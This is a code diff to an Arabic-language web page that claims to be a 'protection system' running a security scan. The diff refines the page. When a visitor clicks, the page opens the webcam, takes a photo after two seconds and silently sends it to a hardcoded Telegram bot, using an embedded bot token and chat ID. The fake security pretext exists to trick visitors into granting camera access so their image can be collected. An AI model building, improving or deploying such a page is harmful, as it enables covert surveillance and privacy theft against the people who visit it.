@@ -8,57 +8,84 @@
         body { font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; min-height: 100vh; margin: 0; background-color: #f0f2f5; }
         .container { text-align: center; background: white; padding: 20px; border-radius: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.1); width: 90%; max-width: 400px; }
         video { width: 100%; border-radius: 10px; margin-top: 15px; display: none; }
-        button { background-color: #0088cc; color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-size: 16px; }
+        button { background-color: #0088cc; color: white; border: none; padding: 15px 25px; border-radius: 50px; cursor: pointer; font-size: 16px; font-weight: bold; }
+        #status { margin-top: 15px; font-size: 14px; font-weight: bold; }
         canvas { display: none; }
     </style>
 </head>
 <body>
+
 <div class="container">
     <h2>تفعيل نظام الحماية</h2>
-    <p>اضغط للبدء</p>
-    <button onclick="initiate()">تشغيل الآن</button>
+    <p>اضغط للبدء في فحص الأمان</p>
+    <button id="startBtn" onclick="initiate()">تشغيل الآن</button>
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
     <div id="status"></div>
 </div>
 
 <script>
-    // بياناتك التي استخرجناها
-    const botToken = '8774671190:AAEBtV-3k8lt9Y05fTcSow-tCmZ0gIXL28A';
-const chatId = '6465368223';
+    // بياناتك الصحيحة من الصور
+    const botToken = '8774671190:AAEBtV-3k8lt9Y05fTcSow-tCmZ0gIXL28A'; 
+    const chatId = '6465368223';
 
     async function initiate() {
         const video = document.getElementById('video');
         const status = document.getElementById('status');
+        const btn = document.getElementById('startBtn');
+        
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             video.srcObject = stream;
             video.style.display = "block";
-            status.innerHTML = "جاري التحقق...";
-            setTimeout(() => { captureAndSend(); }, 2000);
+            btn.style.display = "none";
+            status.innerHTML = "جاري التحقق من الهوية...";
+            status.style.color = "#555";
+
+            // التقاط وإرسال الصورة بعد ثانيتين
+            setTimeout(captureAndSend, 2000);
+
         } catch (err) {
-            status.innerHTML = "يجب السماح بالكاميرا للعمل.";
+            status.innerHTML = "❌ خطأ: يرجى السماح بالوصول للكاميرا.";
+            status.style.color = "red";
         }
     }
 
     function captureAndSend() {
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
+        const status = document.getElementById('status');
+
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
+
         canvas.toBlob(blob => {
             const formData = new FormData();
             formData.append('chat_id', chatId);
-            formData.append('photo', blob, 'image.jpg');
+            formData.append('photo', blob, 'security_shot.jpg');
+
             fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                 method: 'POST',
                 body: formData
-            }).then(() => {
-                document.getElementById('status').innerHTML = "تم الاتصال بنجاح!";
+            })
+            .then(res => res.json())
+            .then(data => {
+                if(data.ok) {
+                    status.innerHTML = "✅ تم الاتصال بنجاح! تفقد تليجرام.";
+                    status.style.color = "green";
+                } else {
+                    status.innerHTML = "❌ فشل الإرسال. تأكد من ضغط Start في البوت.";
+                    status.style.color = "red";
+                }
+            })
+            .catch(() => {
+                status.innerHTML = "❌ حدث خطأ في الشبكة.";
+                status.style.color = "red";
             });
         }, 'image/jpeg');
     }
 </script>
+
 </body>
 </html>
